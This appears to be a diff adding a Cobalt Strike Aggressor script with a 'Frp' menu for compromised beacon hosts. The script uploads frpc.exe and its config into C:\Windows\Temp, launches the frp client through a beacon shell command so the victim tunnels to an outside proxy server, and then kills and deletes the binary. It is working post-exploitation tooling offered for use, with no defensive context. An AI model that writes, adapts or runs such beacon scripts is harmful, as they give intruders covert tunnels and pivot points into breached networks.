@@ -1,0 +1,41 @@
+popup beacon_bottom {
+    menu "Frp"{
+        item "Upload" {
+            $bid = $1;
+            $dialog = dialog("Upload frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &upload);
+            drow_text($dialog, "UploadPath",  "path: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+        sub upload {
+            # switch to specify path
+            bcd($bid, $3['UploadPath']);
+            bsleep($bid, 0 ,0);
+
+            bupload($bid, script_resource("/scripts/frpc.toml"));
+            bupload($bid, script_resource("/scripts/frpc.exe"));
+            
+            show_message("Executing cmmand!");
+        }
+        item "Run"{
+            $bid = $1;
+            $dialog = dialog("Run frpc", %(uri => "frpc.toml -s", bid => $bid), &run);
+            drow_text($dialog, "uri",  "configURI: ");
+            dbutton_action($dialog, "ok");
+            dialog_show($dialog);
+        }
+
+        sub run{
+            local('$Uri');
+            $Uri =  $3['uri'];
+            bshell($bid, "frpc.exe -o  $+ $Uri ");
+            show_message("Executing cmmand!");
+            bsleep($bid, 10, 0);
+        }
+
+        item "Delete" {
+            # local("bid");
+            bshell($1, "taskkill /f /t /im frpc.exe &&  del /f /s /q frpc.exe");
+        }
+    }
+}
